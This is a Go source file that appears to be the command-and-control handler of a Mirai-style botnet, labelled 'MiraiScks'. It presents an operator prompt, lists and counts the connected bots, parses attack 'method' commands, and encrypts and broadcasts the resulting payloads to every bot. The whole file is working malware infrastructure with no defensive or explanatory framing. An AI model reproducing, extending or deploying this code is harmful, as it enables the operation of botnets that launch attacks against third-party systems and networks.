package cnc

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"net/textproto"
	"strings"
)

func (h *Handler) RunConnHandler(conn net.Conn) {
	defer conn.Close()

	// var b = make([]byte, 1024)

	for {
		conn.Write([]byte("\n\rMiraiScks $ "))

		r := bufio.NewReader(conn)
		cmd, err := textproto.NewReader(r).ReadLine()
		if err != nil {
			return
		}

		// ctrl + c
		if bytes.EqualFold([]byte(cmd), []byte{255, 244, 255, 253, 6}) || bytes.Contains([]byte(cmd), []byte{255, 248, 3}) {
			return
		}

		// payload := h.services.Encrypter.Encrypt(cmd, h.services.Encrypter.RandKey())

		// TODO: refactor
		if strings.Contains(cmd, "bots") {
			var final string

			final += fmt.Sprintf("Total: %d\r", h.services.BotCache.Len())

			final += h.services.Cmds.GetBots()
			conn.Write([]byte(final + "\r"))
			continue
		}

		payloadString, isMethod, err := h.services.Parser.Parse(cmd)
		if err != nil {
			conn.Write([]byte(err.Error() + "\r"))
			continue
		}

		if isMethod {
			fmt.Println(payloadString)
			payload := h.services.Encrypter.Encrypt(payloadString, h.services.Encrypter.RandKey())

			h.services.Broadcaster.Broadcast(payload)

			conn.Write([]byte("sent\r"))
		}

		// h.services.Parser.Parse()
	}
}
